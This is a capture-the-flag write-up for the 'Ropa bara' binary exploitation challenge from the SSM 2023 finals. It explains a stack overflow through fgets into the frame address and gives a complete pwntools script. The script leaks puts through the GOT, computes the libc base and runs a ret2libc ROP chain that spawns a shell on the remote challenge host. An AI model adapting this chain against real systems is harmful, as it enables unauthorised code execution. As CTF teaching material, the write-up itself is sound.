# Write-up of the challenge "Ropa bara"

This challenge is part of the **"Binary exploitation"** category and earns 350 points. This challenge was presented in the finals of **"SSM 2023"**.

# Goal of the challenge

So this challenge literally asks you to input something and that's it.

## Program structure

```
#include <stdio.h>

int main(int argc, char *argv[(setvbuf(stdout, NULL, _IONBF, 0), setvbuf(stdin, NULL, _IONBF, 0), puts("Ropa bara!"))], char *envp[(_Atomic) fgets(__builtin_frame_address(0), 64, stdin)]) {}

```

## Problem

The problem I had for 5 minutes is that we had very minimal source code to anaylze, but after doing **"checksec"** I realized that the binary has partial relo and that means the challenge most likely expects us to perform ROP **"ret2libc"**.

## Security breach

**"fgets(__builtin_frame_address(0), 64, stdin)]"**
So this is a security flaw since it allows us to read 64 bytes but what is needed to overrite the **"$RIP"** is only 8 bytes. That means we have a lot of storage for our payload and we don't need to **"Stack pivot"**

## Solution

In the end, I wrote a **"solve.py"** script that leaks **"puts_got"** using **"puts_plt"** from the binary and then subtracts it from **puts** in libc. After that, we set the libc base address and build a ROP chain around it. Since we know the base address, we can also spawn a shell using libc. That's it basically!

```

from pwn import *

elf  = ELF("./ropabara")
libc = ELF("./libc-2.27.so")

p = remote("ssmarkiv.ctfchall.se", 40056)

rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret     = rop.find_gadget(['ret'])[0]

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main     = elf.symbols['main']


payload  = b"A"*8
payload += p64(pop_rdi) + p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)


p.sendline(payload)
p.recvline()

x = p.recvline()

leak = u64(x.strip().ljust(8, b"\x00"))
libc_base = leak - libc.symbols["puts"]

system = libc_base + libc.symbols["system"]
binsh  = libc_base + next(libc.search(b"/bin/sh"))


payload2  = b"A"*8
payload2 += p64(ret)          
payload2 += p64(pop_rdi) + p64(binsh)
payload2 += p64(system)

p.sendline(payload2)

p.interactive()


```

After that, I ran it, spawned a shell, and executed **"cat flag.txt"**.

If you liked this writeup you can star my repository.